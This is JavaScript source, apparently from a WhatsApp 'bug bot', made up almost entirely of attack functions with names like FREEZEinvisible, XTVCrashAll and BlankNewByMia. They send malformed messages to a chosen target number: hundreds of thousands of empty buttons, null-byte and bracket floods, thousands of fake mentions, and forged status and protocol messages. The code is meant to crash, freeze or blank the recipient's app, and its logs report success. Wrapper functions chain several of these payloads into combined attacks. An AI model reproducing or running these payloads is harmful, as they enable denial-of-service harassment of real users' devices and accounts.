async function kumpulanfunctionBlankUI(sock, target) {
    for (let r = 0; r < 1; r++) {
          await blank(sock, target)
          await sleep(800)
          await FreezeXTV(sock, target)
          await XTVcuy(sock, target);
          await sleep(600);
          await VnXNewBlankStcHard(sock, target);
          await freezeButtons(sock, target)
          await sleep(300)
          await BlankUi(sock, target)
          await sleep(600);
    }
}

async function kumpulanfunctionCrashUi(sock, target) {
    for (let r = 0; r < 1; r++) {
          await freezeButtons(sock, target)
          await XTVcuy(sock, target);
          await sleep(1000)
          await sendButtonMessage(sock, target)
          await Fuckyou(sock, target)
    }
}

async function kupulanfuncblanknotif(sock, target) {
    for (let r = 0; r < 1; r++) {
          await FREEZEinvisible(sock, target)
          await sleep(2000)
          await FREEZEinvisible(sock, target)
          await bskTeam(sock, target)
          await sleep(300)
          await Fuckyou(sock, target)
    }
}

async function kumpulanfunctionDELAY(sock, target) {
    for (let r = 0; r < 1; r++) {
          await Exec(sock, target)
          await dileycok(sock, target)
          await sleep(100)
          await VnXNewDelayHard(sock, target)
    }
}

async function FuncDelay(sock, target) {
    for (let r = 0; r < 1; r++) {
          await Exec(sock, target)
          await dileycok(sock, target)
          await sleep(100)
          await VnXNewDelayHard(sock, target)
    }
}

async function Kumpulanfunctionfreezeblank(sock, target) {
    for (let r = 0; r < 1; r++) {
          await freeze(sock, target)
          await sleep(400)
          await freezestc(sock, target)
          await BlankNewByMia(sock, target)
          await sleep(500)
          await ZhidanGabtengBlank(sock, target)
          await bskTeam(sock, target)
          await sleep(300)
          await FreezeChatByMia(sock, target)
          await zmadouk(sock, target)
    }
}

async function FREEZEinvisible(sock, target) {
  try {
    const MakLo1 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "MakLoo¡!",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999,
                  9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: {
              text: "MakLo¡!"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, MakLo1, {});
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    const MakLo2 = {
      groupStatusMessageV2: {
        message: {
          stickerPackMessage: {
            stickerPackId: "\u0000".repeat(999),
            name: "Nando Officiall",
            publisher: "\u0000".repeat(999),
            fileLength: 9999,
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            contextInfo: {
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
            }
          }
        }
      }
    };

    await sock.relayMessage(target, MakLo2, {
      participant: { jid: target }
    });

  } catch (err) {
    console.error("Error FREEZEinvisible:", err.message);
  }
}

async function XTVCrashAll(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: "{".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            messageParamsJson: "{}".repeat(10000),
            buttons: "{}".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
            buttons: "[".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            messageParamsJson: "[]".repeat(10000),
            buttons: "[]".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            messageParamsJson: "\u0000".repeat(10000),
            buttons: "\u0000".repeat(500000)
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function delayXinvisble(sock, target) {
  let msg = {
    groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "XTV" + "\n"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "[".repeat(10000),
                            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
                        }
                    }
                }
            }
        };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
  
  console.log("✅ SUCCESS SEND BUGS");
}

async function KayzenFreezeXDelay(sock, target) {
    const msgId = "VnX-" + Date.now();
    const genJid = (len) => Array.from({ length: len }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net");

    const payloads = [
        {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: { hasMediaAttachment: true, documentMessage: { url: "https://mmg.whatsapp.net/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc", mimetype: "application/javascript", fileLength: "543852", caption: "Ghost-Freeze" } },
                        body: { text: "\u200D".repeat(10000) },
                        nativeFlowMessage: { messageParamsJson: "{}".repeat(5000), buttons: Array.from({ length: 200000 }, () => ({})) }
                    }
                }
            }
        },
        {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(500000) + "Ghost Freeze X Delay",
                        contextInfo: { mentionedJid: genJid(1000) }
                    }
                }
            }
        },
        {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "Ghost-Lock" },
                        nativeFlowMessage: { buttons: Array.from({ length: 200000 }, () => ({})) }
                    }
                }
            }
        }
    ];

    for (const p of payloads) {
        await sock.relayMessage(target, p, { participant: { jid: target } });
    }

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: { protocolMessage: { type: 25, key: { remoteJid: target, fromMe: true, id: msgId } } }
        }
    }, { participant: { jid: target } });

    console.log(`FREEZE : ${target}`);
}

async function VnXNewDelaySpamNotifAi(sock, target) {
  const vnxdly = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Ghost Is Here"
          },
          footer: { 
            text: "By @fuckyanxz"
          },
          nativeFlowMessage: {
            buttons: "\n".repeat(250000)
          }
        }
      }
    }
  }; 

  await sock.relayMessage(
    target,
    {
      protocolMessage: {
        type: 11
      },
      contextInfo: {
        forwardingScore: 9741,
        isForwarded: true,
        forwardedAIBotMessageInfo: {
          botName: "MetaAi",
          botJid: ["13135550202@s.whatsapp.net"],
          creatorName: "@fuckyanxz"
        }
      }
    }, 
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(target, vnxdly, { 
    participant: { jid: target } 
  });
}

async function bskTeam(sock, target) {
  const formattedTarget = target.includes("@") ? target : target + "@s.whatsapp.net";

  const bsk = generateWAMessageFromContent(
    formattedTarget,
    {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "1234567890",
            name: "BeesKa",
            publisher: "كن صادقاً مع نفسك ومع الآخرين".repeat(10000),
            fileLength: "999999",
            fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
            fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
            mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
            directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
            contextInfo: {
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                }
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
              }
            },
            interactiveMessage: {
              body: {
                text: "💣BSK EXECUTOR🩸"
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                    })
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                    })
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                      display_text: "𑜦𑜠".repeat(10000),
                      url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                    })
                  }
                ]
              }
            },
            packDescription: "./zmadouk" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
            mediaKeyTimestamp: "1741150286",
            trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
            thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
            thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
            thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
            stickerPackSize: "999999999",
            stickerPackOrigin: "1"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(formattedTarget, bsk.message, {
    participant: { jid: formattedTarget }
  });
}

async function XTVFreezeChat(sock, target) {
    const genJid = (len) => Array.from({ length: len }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net");
    const formattedTarget = target.includes("@") ? target : target + "@s.whatsapp.net";

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\n",
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc",
                            directPath: "/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc",
                            mimetype: "application/javascript",
                            mediaKey: "+GreUGW3KQJqYcP6q5s6e3ZXbfuGlWLTaCvuGZGwxtk=",
                            fileEncSha256: "VkdUNwow9QIGOOnIsRTE+bnUp1NJ7EMpeuB0ooFZEXY=",
                            fileSha256: "/ISQ9qS7RumnGvf91c9cavwkdeJZ3J4NIomo8MhDsDg=",
                            fileLength: "543852",
                            caption: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 Combo Force Close",
                            mediaKeyTimestamp: "1778292231"
                        }
                    },
                    body: { text: "\n" },
                    nativeFlowMessage: {
                        messageParamsJson: "{{".repeat(10000),
                        buttons: Array.from({ length: 300000 }, () => ({}))
                    }
                }
            }
        }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0000".repeat(800000) + "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰-Combo-Blast",
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...genJid(2000)]
                    }
                }
            }
        }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    type: 25,
                    key: { remoteJid: target, fromMe: true, id: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰-" + Date.now() }
                }
            }
        }
    }, { participant: { jid: target } });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰" },
                    nativeFlowMessage: { buttons: Array.from({ length: 300000 }, () => ({})) }
                }
            }
        }
    }, { participant: { jid: target } });

    const bsk = generateWAMessageFromContent(
        formattedTarget,
        {
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: "1234567890",
                        name: "BeesKa",
                        publisher: "كن صادقاً مع نفسك ومع الآخرين".repeat(10000),
                        fileLength: "999999",
                        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                        directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                }
                            },
                            forwardedAiBotMessageInfo: {
                                botName: "META AI",
                                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                creatorName: "Bot"
                            }
                        },
                        interactiveMessage: {
                            body: {
                                text: "💣BSK EXECUTOR🩸"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                        })
                                    }
                                ]
                            }
                        },
                        packDescription: "./zmadouk" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                        mediaKeyTimestamp: "1741150286",
                        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                        thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
                        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
                        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
                        thumbnailHeight: 252,
                        thumbnailWidth: 252,
                        imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
                        stickerPackSize: "999999999",
                        stickerPackOrigin: "1"
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(formattedTarget, bsk.message, {
        participant: { jid: formattedTarget }
    });
}

async function VnXIsHere(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰 Is Here",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
              version: 3
            }
          }
        }
      },
      contextInfo: {
        remoteJid: "#VnXNew - By @fuckyanxz",
        mentionedJid: [
          '0@s.whatsapp.net',
          ...Array.from(
            { length: 2000 },
            () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
          )
        ]
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function freezestc(sock, target) { 
  const stcmsg = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦽ".repeat(45000),
      publisher: "../RTR.",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: " ATR - stcmsg G BG ",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  await sock.relayMessage(target, stcmsg, {
    participant: { jid: target }
  });

  console.log(`Success Send To ${target}`);
}


async function BlankNewByMia(client, target) {
    try {
        const generateId = () => Math.random().toString(36).substring(2, 15);
      
        const msg = {
            key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
                    caption: "Queen Mia, Queen Of Dark",
                    fileLength: "149502",
                    height: 1397,
                    width: 1126,
                    mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
                    fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
                    directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1777621571",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
                    contextInfo: {
                        pairedMediaType: "SUPERMARKET.QUEENMIA",
                        isQuestion: true,
                        isGroupStatus: true
                    },
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
                    midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
                }
            },
            messageTimestamp: Math.floor(Date.now() / 1000)
        };
        
        await client.relayMessage("status@broadcast", msg.message, {
            statusJidList: [target],
            messageId: msg.key.id,
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target },
                        content: undefined
                    }]
                }]
            }]
        });
        
        await new Promise(r => setTimeout(r, 200));
        
        await client.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, { participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        await client.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9999999999999,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "hanzz.pdf",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                        },
                        body: { text: "i love you." },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(950000)
                            }]
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 9999999999999,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "hanzz.7z",
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }
                }
            }
        }, { messageId: null, participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        await client.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: "kangen" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(150000),
                                })
                            }],
                            version: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
        
        await new Promise(r => setTimeout(r, 200));
        
        const msg1 = await generateWAMessageFromContent(target, {
            newsletterAdminInviteMessage: {
                newsletterJid: "1@newsletter",
                newsletterName: "𓆩᬴𓆪".repeat(80000),
                caption: "ꦾ".repeat(80000),
                inviteCode: "ꦽ".repeat(80000),
                contextInfo: {
                    locationMessage: {
                        degreesLatitude: 23045678087,
                        degreesLongitude: 23045678087,
                        name: "galaxy_message"
                    },
                    forwardingScore: 99999,
                    isForwarded: true,
                    quotedMessage: {
                        locationMessage: {
                            degreesLatitude: 91,
                            degreesLongitude: 181,
                            name: "call_permission_request"
                        }
                    },
                    externalAdReply: {
                        title: "ayo ngedate",
                        body: "ꦾ".repeat(80000),
                        mediaType: 1,
                        thumbnail: null,
                        sourceUrl: "https://",
                        showAdAttribution: true,
                        renderLargerThumbnail: true,
                        locationMessage: {
                            degreesLatitude: 1010101,
                            degreesLongitude: 1010101,
                            name: "single_select"
                        }
                    }
                }
            }
        }, { forwardingScore: 99999, isForwarded: true, participant: { jid: target } });
        
        await client.relayMessage(target, msg1.message, { messageId: msg1.key.id });
        
        console.log(`succes sent to ${target}`);
        
    } catch (error) {
        console.error(`error ${error.message}`);
    }
}

